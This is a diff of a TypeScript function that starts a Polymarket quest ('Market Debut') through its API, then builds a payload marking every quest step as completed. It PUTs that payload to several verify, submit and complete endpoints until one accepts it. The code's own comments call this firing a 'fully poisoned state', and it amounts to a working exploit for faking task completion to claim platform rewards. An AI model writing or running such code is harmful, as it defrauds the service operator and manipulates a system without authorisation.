@@ -34,11 +34,12 @@ export async function pollAccountVerification(input: string): Promise<{ success:
 
     const questId = '81ff3b8a-03bf-488c-828c-f60923e96149';
     const questName = 'Market Debut';
+    const questSlug = 'kick-off-with-polymarket-us';
     const userId = extractUserId(token);
 
     const logs = [];
 
-    // Step 1: Start / Initialize user quest instance to get the full server state schema
+    // Step 1: Initialize user quest instance
     const startUrl = userId 
       ? `${SUBDOMAIN_API}/api/quests/${questId}/start?user_id=${userId}`
       : `${SUBDOMAIN_API}/api/quests/${questId}/start`;
@@ -54,35 +55,44 @@ export async function pollAccountVerification(input: string): Promise<{ success:
     const serverInstance = startRes.data || {};
     const userQuestId = serverInstance.id || '26ada2ca-8b24-4cc6-9566-b826026397ab';
 
-    // Step 2: Take the exact server instance schema, inject 'name', and mark all steps completed
-    const fullCompletedProgress: Record<string, any> = {};
-    const existingProgress = serverInstance.step_progress || { "0": {}, "1": {}, "2": {}, "3": {} };
+    // Step 2: Force all step_progress keys (0, 1, 2, 3) to fully completed state
+    const currentProgress = serverInstance.step_progress || {};
+    const forcedStepProgress: Record<string, any> = {};
     
-    for (const key of Object.keys(existingProgress)) {
-      fullCompletedProgress[key] = {
-        ...(existingProgress[key] || {}),
-        count: existingProgress[key]?.target || 1,
-        cumulative_value: existingProgress[key]?.target || 1,
-        target: existingProgress[key]?.target || 1,
+    const stepKeys = Object.keys(currentProgress).length > 0 ? Object.keys(currentProgress) : ["0", "1", "2", "3"];
+    
+    for (const key of stepKeys) {
+      const targetVal = currentProgress[key]?.target || 1;
+      forcedStepProgress[key] = {
+        ...(currentProgress[key] || {}),
+        count: targetVal,
+        cumulative_value: targetVal,
+        target: targetVal,
         completed: true,
         status: 'completed',
         completed_at: new Date().toISOString()
       };
     }
 
-    const completePayload = {
+    const payload = {
       ...serverInstance,
+      id: userQuestId,
+      user_quest_id: userQuestId,
+      quest_id: questId,
+      questId: questId,
+      slug: questSlug,
       name: questName,
       status: 'completed',
-      current_step: serverInstance.total_steps || 4,
-      steps_completed: serverInstance.total_steps || 4,
+      current_step: stepKeys.length,
+      steps_completed: stepKeys.length,
+      total_steps: stepKeys.length,
       completion_percentage: 100,
-      step_progress: fullCompletedProgress,
+      step_progress: forcedStepProgress,
       completed_at: new Date().toISOString()
     };
 
-    // Step 3: Dispatch the fully synchronized schema payload to the active PUT endpoints
-    const targetEndpoints = [
+    // Step 3: Fire against primary completion endpoints with the fully poisoned state
+    const endpoints = [
       `${SUBDOMAIN_API}/api/quests/verify`,
       `${SUBDOMAIN_API}/api/quests/submit`,
       `${SUBDOMAIN_API}/api/quests/complete`
@@ -91,8 +101,8 @@ export async function pollAccountVerification(input: string): Promise<{ success:
     let completed = false;
     let winningResult = null;
 
-    for (const url of targetEndpoints) {
-      const res = await axios.put(url, completePayload, {
+    for (const url of endpoints) {
+      const res = await axios.put(url, payload, {
         headers,
         timeout: 8000,
         validateStatus: () => true
@@ -114,7 +124,7 @@ export async function pollAccountVerification(input: string): Promise<{ success:
     return {
       success: true,
       data: { userQuestId, completed, winningResult, logs },
-      message: completed ? '🚀 Polymarket Quest Fully Completed & Ticked!' : '⚡ Synchronized payload dispatched. Check response logs.'
+      message: completed ? '🚀 Polymarket Quest Fully Completed & Ticked!' : '⚡ Sequence dispatched. Check response logs.'
     };
 
   } catch (error: any) {
